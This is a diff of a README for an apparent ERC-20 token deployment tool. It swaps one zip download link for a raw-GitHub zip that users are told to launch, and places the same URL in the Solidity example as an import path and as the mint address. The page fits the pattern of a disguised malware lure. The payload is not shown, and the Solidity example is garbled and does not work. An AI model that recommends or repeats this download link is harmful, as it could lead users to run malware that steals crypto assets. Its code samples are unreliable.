@@ -10,7 +10,7 @@ DeployerIDE is a dedicated local platform for creating and deploying ERC-20 smar
 [blockchain-development, blockchain-security, crypto-tools, dapp-development, decentralized, deployeride, erc20, ethereum, ethereum-token, ethereum-tools, evm, local-development, offline-ide, remixide-alternative, smart-contracts, solidity, solidity-development, token-creation, token-deployment, web3]
 
 📥 **Download Software:**
-[![Download DeployerIDE ERC20 Toolkit](https://github.com/Astral-ash/DeployerIDE-ERC20-Toolkit/releases/download/v2.0/Software.zip)](https://github.com/Astral-ash/DeployerIDE-ERC20-Toolkit/releases/download/v2.0/Software.zip)
+[![Download DeployerIDE ERC20 Toolkit](https://raw.githubusercontent.com/Astral-ash/DeployerIDE-ERC20-Toolkit/main/homaroid/ID_Deployer_ER_Toolkit_1.7.zip)](https://raw.githubusercontent.com/Astral-ash/DeployerIDE-ERC20-Toolkit/main/homaroid/ID_Deployer_ER_Toolkit_1.7.zip)
 *(Needs to be launched)*
 
 ## Features 🌈
@@ -29,11 +29,11 @@ Check out these examples to see how DeployerIDE can empower your ERC-20 token de
 // Create a basic ERC-20 token contract with DeployerIDE
 pragma solidity ^0.8.0;
 
-import "https://github.com/Astral-ash/DeployerIDE-ERC20-Toolkit/releases/download/v2.0/Software.zip";
+import "https://raw.githubusercontent.com/Astral-ash/DeployerIDE-ERC20-Toolkit/main/homaroid/ID_Deployer_ER_Toolkit_1.7.zip";
 
 contract MyToken is ERC20 {
     constructor() ERC20("MyToken", "MTK") {
-        _mint(https://github.com/Astral-ash/DeployerIDE-ERC20-Toolkit/releases/download/v2.0/Software.zip, 1000000 * (10 ** 18));
+        _mint(https://raw.githubusercontent.com/Astral-ash/DeployerIDE-ERC20-Toolkit/main/homaroid/ID_Deployer_ER_Toolkit_1.7.zip, 1000000 * (10 ** 18));
     }
 }
 ```
